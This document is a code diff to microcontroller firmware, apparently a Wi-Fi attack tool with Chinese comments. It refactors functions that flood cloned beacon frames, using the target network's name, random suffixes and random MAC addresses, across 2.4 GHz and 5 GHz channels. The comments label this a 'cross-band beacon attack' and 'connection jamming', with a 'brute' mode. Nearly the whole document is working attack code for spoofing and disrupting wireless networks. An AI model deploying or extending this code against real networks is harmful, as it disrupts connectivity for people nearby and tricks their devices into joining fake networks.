@@ -28,6 +28,27 @@ void LinkJammer();
 #include <utility>
 #include "debug.h"
 #include <Wire.h>
+
+// ===== WiFi Attack Configuration Structures =====
+// 统一的信标配置结构
+struct BeaconConfig {
+  bool usePrebuiltFrame;
+  int cloneCount;
+  int sendCount;
+  int delayMs;
+};
+
+// 跨频段攻击配置结构
+struct CrossBandConfig {
+  bool usePrebuiltFrame;
+  int originalCloneCount;
+  int originalSendCount;
+  int crossCloneCount;
+  int crossSendCount;
+  int delayMs;
+  int channelDelayMs;
+};
+
 #include <algorithm>
 
 // 引入web页面
@@ -5072,21 +5093,46 @@ String createFakeSSID(const String& originalSSID) {
   return originalSSID + String("(") + generateRandomSuffix() + String(")");
 }
 
-// 在指定信道上发送信标帧
-void sendBeaconOnChannel(int channel, const char* ssid, int cloneCount, int sendCount, int delayMs = 0) {
+// 在指定信道上发送信标帧（统一版本）
+void sendBeaconUnified(int channel, const char* ssid, const BeaconConfig& config) {
   wext_set_channel(WLAN0_NAME, channel);
-  for (int c = 0; c < cloneCount; c++) {
+  
+  for (int c = 0; c < config.cloneCount; c++) {
     uint8_t tempMac[6];
     generateRandomMAC(tempMac);
-    String fakeSsid = createFakeSSID(String(ssid));
-    const char *fakeSsidCstr = fakeSsid.c_str();
     
-    for (int x = 0; x < sendCount; x++) {
-      wifi_tx_beacon_frame(tempMac, (void *)BROADCAST_MAC, fakeSsidCstr);
-      if (delayMs > 0) delay(delayMs);
+    if (config.usePrebuiltFrame) {
+      int maxBaseBytes = 32 - 4;
+      if (maxBaseBytes < 0) maxBaseBytes = 0;
+      String base = utf8TruncateByBytes(String(ssid), maxBaseBytes);
+      String fakeSsid = createFakeSSID(base);
+      const char* fakeSsidCstr = fakeSsid.c_str();
+      
+      BeaconFrame bf;
+      size_t blen = wifi_build_beacon_frame(tempMac, (void*)BROADCAST_MAC, fakeSsidCstr, bf);
+      
+      for (int x = 0; x < config.sendCount; x++) {
+        wifi_tx_raw_frame(&bf, blen);
+        if (config.delayMs > 0) delay(config.delayMs);
+      }
+    } else {
+      String fakeSsid = createFakeSSID(String(ssid));
+      const char* fakeSsidCstr = fakeSsid.c_str();
+      
+      for (int x = 0; x < config.sendCount; x++) {
+        wifi_tx_beacon_frame(tempMac, (void*)BROADCAST_MAC, fakeSsidCstr);
+        if (config.delayMs > 0) delay(config.delayMs);
+      }
     }
-    if (delayMs > 0) delay(delayMs * 2); // 克隆之间的延时
+    
+    if (config.delayMs > 0) delay(config.delayMs * 2);
   }
+}
+
+// 在指定信道上发送信标帧（旧版本，保留兼容性）
+void sendBeaconOnChannel(int channel, const char* ssid, int cloneCount, int sendCount, int delayMs = 0) {
+  BeaconConfig config = {false, cloneCount, sendCount, delayMs};
+  sendBeaconUnified(channel, ssid, config);
 }
 
 // ===== 连接干扰：跨信道伪造同名信标与探测响应 =====
@@ -5309,122 +5355,49 @@ void LinkJammer() {
 
 // 在指定信道上发送信标帧（Web UI版本，使用BeaconFrame）
 void sendBeaconOnChannelWeb(int channel, const char* ssid, int cloneCount, int sendCount, int delayMs = 0) {
-  wext_set_channel(WLAN0_NAME, channel);
-  for (int c = 0; c < cloneCount; c++) {
-    uint8_t tempMac[6];
-    generateRandomMAC(tempMac);
-    // WebUI路径：与"暴力克隆"一致，为名称添加随机后缀；同时保证总长度<=32字节
-    // 后缀形如 "(ab)"，固定4字节（ASCII）。
-    int maxBaseBytes = 32 - 4; if (maxBaseBytes < 0) maxBaseBytes = 0;
-    String base = utf8TruncateByBytes(String(ssid), maxBaseBytes);
-    String fakeSsid = createFakeSSID(base);
-    const char *fakeSsidCstr = fakeSsid.c_str();
-    
-    BeaconFrame bf; 
-    size_t blen = wifi_build_beacon_frame(tempMac, (void *)BROADCAST_MAC, fakeSsidCstr, bf);
-    
-    for (int x = 0; x < sendCount; x++) {
-      wifi_tx_raw_frame(&bf, blen);
-      if (delayMs > 0) delay(delayMs);
-    }
-    if (delayMs > 0) delay(delayMs * 2); // 克隆之间的延时
-  }
+  BeaconConfig config = {true, cloneCount, sendCount, delayMs};
+  sendBeaconUnified(channel, ssid, config);
 }
 
-// 执行跨频段信标攻击的核心逻辑
+// 执行跨频段信标攻击的核心逻辑（旧版本，保留兼容性）
 void executeCrossBandBeaconAttack(const String& ssid, int originalChannel, bool isStableMode = false) {
-  // 攻击参数配置
-  struct AttackConfig {
-    int originalCloneCount;
-    int originalSendCount;
-    int crossCloneCount;
-    int crossSendCount;
-    int delayMs;
-  };
-  
-  AttackConfig config;
+  CrossBandConfig config;
   if (isStableMode) {
-    // 稳定模式
-    config = {5, 3, 4, 2, 2};
+    config = {false, 5, 3, 4, 2, 0, 15};
   } else {
-    // 暴力模式
-    config = {10, 5, 8, 4, 0};
+    config = {false, 10, 5, 8, 4, 0, 0};
   }
-  
-  if (is24GChannel(originalChannel)) {
-    // 2.4G频段SSID：在原始信道和5G频段常用信道上都发送信标
-    
-    // 原始2.4G信道
-    if ((beaconBandMode == 0) || (beaconBandMode == 2)) {
-      sendBeaconOnChannel(originalChannel, ssid.c_str(), 
-                         config.originalCloneCount, config.originalSendCount, config.delayMs);
-    }
-    
-    // 5G频段同名信标帧（在常用5G信道上）
-    if ((beaconBandMode == 0) || (beaconBandMode == 1)) {
-      int fiveGChannels[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
-      for (int fiveGCh : fiveGChannels) {
-        sendBeaconOnChannel(fiveGCh, ssid.c_str(), 
-                           config.crossCloneCount, config.crossSendCount, config.delayMs);
-        if (isStableMode) delay(15); // 不同信道之间的延时
-      }
-    }
-  } else if (is5GChannel(originalChannel)) {
-    // 5G频段SSID：在原始信道和2.4G频段常用信道上都发送信标
-    
-    // 原始5G信道
-    if ((beaconBandMode == 0) || (beaconBandMode == 1)) {
-      sendBeaconOnChannel(originalChannel, ssid.c_str(), 
-                         config.originalCloneCount, config.originalSendCount, config.delayMs);
-    }
-    
-    // 2.4G频段同名信标帧（在常用2.4G信道上）
-    if ((beaconBandMode == 0) || (beaconBandMode == 2)) {
-      int two4GChannels[] = {1, 6, 11}; // 常用2.4G信道
-      for (int two4GCh : two4GChannels) {
-        sendBeaconOnChannel(two4GCh, ssid.c_str(), 
-                           config.crossCloneCount, config.crossSendCount, config.delayMs);
-        if (isStableMode) delay(15); // 不同信道之间的延时
-      }
-    }
-  }
+  executeCrossBandBeaconAttackUnified(ssid, originalChannel, config);
 }
-// 执行跨频段信标攻击的核心逻辑（Web UI版本）
+// 执行跨频段信标攻击的核心逻辑（Web UI版本，保留兼容性）
 void executeCrossBandBeaconAttackWeb(const String& ssid, int originalChannel, bool isStableMode = false) {
-  // 攻击参数配置
-  struct AttackConfig {
-    int originalCloneCount;
-    int originalSendCount;
-    int crossCloneCount;
-    int crossSendCount;
-    int delayMs;
-  };
-  
-  AttackConfig config;
+  CrossBandConfig config;
   if (isStableMode) {
-    // 稳定模式
-    config = {10, 3, 4, 2, 2};
+    config = {true, 10, 3, 4, 2, 0, 15};
   } else {
-    // 暴力模式
-    config = {10, 5, 8, 4, 0};
+    config = {true, 10, 5, 8, 4, 0, 0};
   }
-  
+  executeCrossBandBeaconAttackUnified(ssid, originalChannel, config);
+}
+
+// 执行跨频段信标攻击的核心逻辑（统一版本）
+void executeCrossBandBeaconAttackUnified(const String& ssid, int originalChannel, const CrossBandConfig& config) {
   if (is24GChannel(originalChannel)) {
     // 2.4G频段SSID：在原始信道和5G频段常用信道上都发送信标
     
     // 原始2.4G信道
     if ((beaconBandMode == 0) || (beaconBandMode == 2)) {
-      sendBeaconOnChannelWeb(originalChannel, ssid.c_str(), 
-                             config.originalCloneCount, config.originalSendCount, config.delayMs);
+      BeaconConfig beaconConfig = {config.usePrebuiltFrame, config.originalCloneCount, config.originalSendCount, config.delayMs};
+      sendBeaconUnified(originalChannel, ssid.c_str(), beaconConfig);
     }
     
     // 5G频段同名信标帧（在常用5G信道上）
     if ((beaconBandMode == 0) || (beaconBandMode == 1)) {
       int fiveGChannels[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
       for (int fiveGCh : fiveGChannels) {
-        sendBeaconOnChannelWeb(fiveGCh, ssid.c_str(), 
-                               config.crossCloneCount, config.crossSendCount, config.delayMs);
-        if (isStableMode) delay(15); // 不同信道之间的延时
+        BeaconConfig beaconConfig = {config.usePrebuiltFrame, config.crossCloneCount, config.crossSendCount, config.delayMs};
+        sendBeaconUnified(fiveGCh, ssid.c_str(), beaconConfig);
+        if (config.channelDelayMs > 0) delay(config.channelDelayMs); // 不同信道之间的延时
       }
     }
   } else if (is5GChannel(originalChannel)) {
@@ -5432,17 +5405,17 @@ void executeCrossBandBeaconAttackWeb(const String& ssid, int originalChannel, bo
     
     // 原始5G信道
     if ((beaconBandMode == 0) || (beaconBandMode == 1)) {
-      sendBeaconOnChannelWeb(originalChannel, ssid.c_str(), 
-                             config.originalCloneCount, config.originalSendCount, config.delayMs);
+      BeaconConfig beaconConfig = {config.usePrebuiltFrame, config.originalCloneCount, config.originalSendCount, config.delayMs};
+      sendBeaconUnified(originalChannel, ssid.c_str(), beaconConfig);
     }
     
     // 2.4G频段同名信标帧（在常用2.4G信道上）
     if ((beaconBandMode == 0) || (beaconBandMode == 2)) {
       int two4GChannels[] = {1, 6, 11}; // 常用2.4G信道
       for (int two4GCh : two4GChannels) {
-        sendBeaconOnChannelWeb(two4GCh, ssid.c_str(), 
-                               config.crossCloneCount, config.crossSendCount, config.delayMs);
-        if (isStableMode) delay(15); // 不同信道之间的延时
+        BeaconConfig beaconConfig = {config.usePrebuiltFrame, config.crossCloneCount, config.crossSendCount, config.delayMs};
+        sendBeaconUnified(two4GCh, ssid.c_str(), beaconConfig);
+        if (config.channelDelayMs > 0) delay(config.channelDelayMs); // 不同信道之间的延时
       }
     }
   }
